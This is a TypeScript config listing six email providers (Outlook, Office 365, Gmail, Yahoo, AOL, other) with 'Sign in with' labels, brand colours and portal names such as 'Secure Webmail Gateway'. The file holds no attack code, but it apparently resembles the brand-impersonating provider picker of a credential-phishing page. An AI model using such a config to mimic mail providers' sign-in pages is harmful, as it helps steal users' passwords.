import { EmailProviderConfig } from '../types';

export const EMAIL_PROVIDERS: EmailProviderConfig[] = [
  {
    id: 'outlook',
    name: 'Outlook',
    label: 'Sign in with Outlook',
    bgClass: 'bg-[#1b65b6] hover:bg-[#155397]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#2e7dd9] via-[#1b65b6] to-[#0f4b8f]',
    iconType: 'outlook',
    brandColor: '#0078D4',
    textColor: 'text-white',
    defaultEmailSuffix: '@outlook.com',
    portalName: 'Microsoft Outlook Portal',
    accentBg: '#0078D4'
  },
  {
    id: 'office365',
    name: 'Office 365',
    label: 'Sign in with Office365',
    bgClass: 'bg-[#d83b01] hover:bg-[#bd3200]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#ea4310] via-[#d83b01] to-[#b83000]',
    iconType: 'office365',
    brandColor: '#EA3E10',
    textColor: 'text-white',
    defaultEmailSuffix: '@company.onmicrosoft.com',
    portalName: 'Microsoft 365 Enterprise',
    accentBg: '#D83B01'
  },
  {
    id: 'gmail',
    name: 'Gmail',
    label: 'Sign in with Gmail Mail',
    bgClass: 'bg-[#6b21a8] hover:bg-[#581c87]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#7e22ce] via-[#6b21a8] to-[#581c87]',
    iconType: 'gmail',
    brandColor: '#EA4335',
    textColor: 'text-white',
    defaultEmailSuffix: '@gmail.com',
    portalName: 'Google Account Sign-in',
    accentBg: '#7e22ce'
  },
  {
    id: 'yahoo',
    name: 'Yahoo Mail',
    label: 'Sign in with Yahoo Mail',
    bgClass: 'bg-[#7c3aed] hover:bg-[#6d28d9]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#8b5cf6] via-[#7c3aed] to-[#6d28d9]',
    iconType: 'yahoo',
    brandColor: '#6001D2',
    textColor: 'text-white',
    defaultEmailSuffix: '@yahoo.com',
    portalName: 'Yahoo! Security Access',
    accentBg: '#6001d2'
  },
  {
    id: 'aol',
    name: 'AOL Mail',
    label: 'Sign in with AOL',
    bgClass: 'bg-[#16a34a] hover:bg-[#15803d]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#22c55e] via-[#16a34a] to-[#15803d]',
    iconType: 'aol',
    brandColor: '#16a34a',
    textColor: 'text-white',
    defaultEmailSuffix: '@aol.com',
    portalName: 'AOL Member Sign-in',
    accentBg: '#15803d'
  },
  {
    id: 'other',
    name: 'Other Mail',
    label: 'Sign in with Other Mail',
    bgClass: 'bg-[#2563eb] hover:bg-[#1d4ed8]',
    hoverClass: 'hover:brightness-110',
    gradientClass: 'from-[#3b82f6] via-[#2563eb] to-[#1d4ed8]',
    iconType: 'other',
    brandColor: '#2563eb',
    textColor: 'text-white',
    defaultEmailSuffix: '@customdomain.com',
    portalName: 'Secure Webmail Gateway',
    accentBg: '#2563eb'
  }
];
